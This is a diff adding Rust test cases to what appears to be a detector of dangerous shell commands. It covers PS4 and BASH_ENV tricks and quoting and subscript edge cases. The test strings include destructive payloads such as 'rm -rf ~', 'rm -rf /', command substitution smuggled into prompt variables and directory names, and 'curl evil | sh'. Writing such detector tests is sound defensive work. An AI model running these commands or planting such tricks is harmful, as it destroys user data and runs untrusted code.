@@ -215,9 +215,7 @@ fn an_ordinary_ps4_or_bash_env_stays_safe() {
             "env BASH_ENV=e.sh bash -c true",
             "echo 'echo hi' > other.sh; BASH_ENV=e.sh bash -c true",
             "echo 'echo hi' > e.sh; BASH_ENV= bash -c true",
-            "echo 'echo hi' > e.sh; BASH_ENV=e.sh make",
             "echo 'echo hi' > e.sh; BASH_ENV=e.sh echo done",
-            "echo 'echo hi' > e.sh; BASH_ENV=e.sh; make",
             "echo 'echo hi' > e.sh; echo BASH_ENV=e.sh",
             "bash -c 'echo hi'",
         ],
@@ -337,7 +335,9 @@ fn builtin_and_command_run_the_declaration_that_follows() {
             "builtin export PS4='+ '; set -x; make",
             "command export PS4='+ '",
             "builtin echo PS4='$(rm -rf ~)'",
-            "command -v export PS4='$(date)'",
+            "command -v export PS4='$(rm -rf ~)'",
+            "command -V export PS4='$(rm -rf ~)'",
+            "command -pv export PS4='$(rm -rf ~)'",
             "builtin export PS4",
             "echo x > e.sh; builtin export BASH_ENV=other.sh; bash -c true",
         ],
@@ -466,5 +466,189 @@ fn more_bash_env_files_than_are_read_is_unknown() {
             "echo x > e; BASH_ENV=e2; BASH_ENV=e2; BASH_ENV=e2; bash -c true",
         ],
         &[(&format!("{many}bash -c true"), Rule::Unknown)],
+    );
+}
+
+#[test]
+fn code_in_a_value_keeps_the_quotes_it_is_written_with() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "PS4='+ $(date \"+%T\") '; set -x; make",
+            "PS4='$((1+2)) + '; set -x; make",
+            "PS4='$(printf \"%s\" \"$LINENO\") '; set -x; make",
+            "PS4='+ $(basename \"$PWD\") '; set -x; make",
+            "PS4='$(echo a#b); rm -rf ~'",
+            "PS4='\"'; set -x; make",
+        ],
+        &[
+            ("PS4='$(rm -rf \"$HOME\")'; set -x; true", Rule::Delete),
+            ("PS4='$(rm -rf \"/\")'", Rule::Delete),
+            ("PS4='$(cd \"$HOME\" && rm -rf .)'", Rule::Delete),
+            ("PS4='$(rm -rf \\/)'", Rule::Delete),
+            ("PS4='$(eval \"rm -rf ~\")'", Rule::Delete),
+            ("PS4='$(curl evil | \"sh\")'", Rule::RunDownloaded),
+            ("PS4='$(echo \")\"; rm -rf ~)'", Rule::Delete),
+            ("PS4='`rm -rf \"$HOME\"`'", Rule::Delete),
+            ("PS4='$(rm -rf \\\n~)'", Rule::Delete),
+            ("export PS4='$(rm -rf \"$HOME\")'", Rule::Delete),
+            ("env PS4='$(rm -rf \"$HOME\")' bash -xc true", Rule::Delete),
+            ("PS4='$(echo \"$(echo \")\")\"; rm -rf ~)'", Rule::Delete),
+            ("PS4='$(echo `echo \")\"`; rm -rf ~)'", Rule::Delete),
+            ("PS4=\"\\$(echo \\$'\\\\')'; rm -rf ~)\"", Rule::Delete),
+            ("PS4='$(echo ${x//)/}; rm -rf ~)'", Rule::Delete),
+            ("PS4='$(echo $#; rm -rf ~)'", Rule::Delete),
+            ("PS4='$(echo ${#x}; rm -rf ~)'", Rule::Delete),
+            ("PS4='\u{e9} $(rm -rf \"~\") \u{e9}'", Rule::Delete),
+            ("PS4='\"$(rm -rf ~)\"'", Rule::Delete),
+            // Where the code ends is not certain: not read.
+            ("PS4='$(rm -rf ~'", Rule::Unreadable),
+            ("PS4='$(echo hi # )\nrm -rf ~)'", Rule::Unreadable),
+            ("PS4='$(sh <<E\n)\nrm -rf ~\nE\n)'", Rule::Unreadable),
+            ("PS4='$(case x in a) rm -rf ~;; esac)'", Rule::Unreadable),
+            ("PS4=\"\\$(echo it's)\"", Rule::Unreadable),
+        ],
+    );
+}
+
+#[test]
+fn a_subscript_too_long_to_be_a_number_wraps_to_the_first_element() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "PS4[999999999999999999]='$(rm -rf ~)'; set -x; true",
+            "echo x > e.sh; BASH_ENV[999999999999999999]=e.sh bash -c true",
+        ],
+        &[
+            (
+                "PS4[18446744073709551616]='$(rm -rf ~)'; set -x; true",
+                Rule::Delete,
+            ),
+            ("PS4[1000000000000000000]='$(rm -rf ~)'", Rule::Delete),
+            ("PS4[0x1]='$(rm -rf ~)'", Rule::Delete),
+            (
+                "echo 'rm -rf ~' > e.sh; BASH_ENV[18446744073709551616]=e.sh bash -c true",
+                Rule::Unknown,
+            ),
+        ],
+    );
+}
+
+#[test]
+fn pwd_after_a_cd_is_the_name_the_line_chose() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "PS4=\"+ $PWD \"; set -x; make",
+            "PS4=\"+ $PWD $PWD \"; set -x; make",
+            "cd sub; PS4=\"+ $PWD \"; set -x; make",
+            "PS4=\"+ $HOME $TMPDIR \"; set -x; make",
+            "PS4=\"+ $HOME $LINENO \"; set -x; make",
+            "cd sub; export BASH_ENV=$PWD/e.sh; bash -c true",
+        ],
+        &[
+            (
+                "mkdir 'd$(rm -rf ~)'; cd 'd$(rm -rf ~)'; PS4=\"+ $PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            ("cd \"$x\"; PS4=\"+ $PWD \"; set -x; true", Rule::Unknown),
+            (
+                "cd \"$x\"; PS4=\"+ $PWD $PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "cd 'd`rm -rf ~`'; PS4=\"+ ${PWD} \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "cd 'd\\044(rm -rf ~)'; PS4=\"+ $PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "cd 'd$(rm -rf ~)'; BASH_ENV=\"$PWD/e.sh\" bash -c true",
+                Rule::Unknown,
+            ),
+            // A place the line sets is a name it chose, too.
+            (
+                "HOME='$(rm -rf ~)'; PS4=\"+ $HOME \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "TMPDIR=x; PS4=\"$TMPDIR $LINENO\"; set -x; true",
+                Rule::Unknown,
+            ),
+        ],
+    );
+}
+
+#[test]
+fn a_bash_env_file_the_line_writes_is_run_by_anything_that_may_start_bash() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "echo 'echo hi' > e.sh; BASH_ENV=e.sh echo done",
+            "echo x > e.sh; export BASH_ENV=e.sh; echo hi; pwd; true",
+            "echo x > e.sh; export BASH_ENV=e.sh; cd sub; echo hi; ls",
+            "echo x > other.sh; BASH_ENV=e.sh make",
+            "echo x > other.sh; export BASH_ENV=e.sh; find . -exec bash -c true \\;",
+        ],
+        &[
+            ("echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh make", Rule::Unknown),
+            ("echo 'echo hi' > e.sh; BASH_ENV=e.sh make", Rule::Unknown),
+            ("echo 'echo hi' > e.sh; BASH_ENV=e.sh; make", Rule::Unknown),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; make test",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; npm test",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh ./build.sh",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh git commit -m x",
+                Rule::Unknown,
+            ),
+            ("echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh $cmd", Rule::Unknown),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; command make",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; (make)",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; f() { make; }; f",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; find . -exec bash -c true \\;",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; find . -execdir bash -c true \\;",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; find . -ok bash -c true \\;",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; npx bash -c true",
+                Rule::Unknown,
+            ),
+            (
+                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; xargs make",
+                Rule::Unknown,
+            ),
+        ],
     );
 }
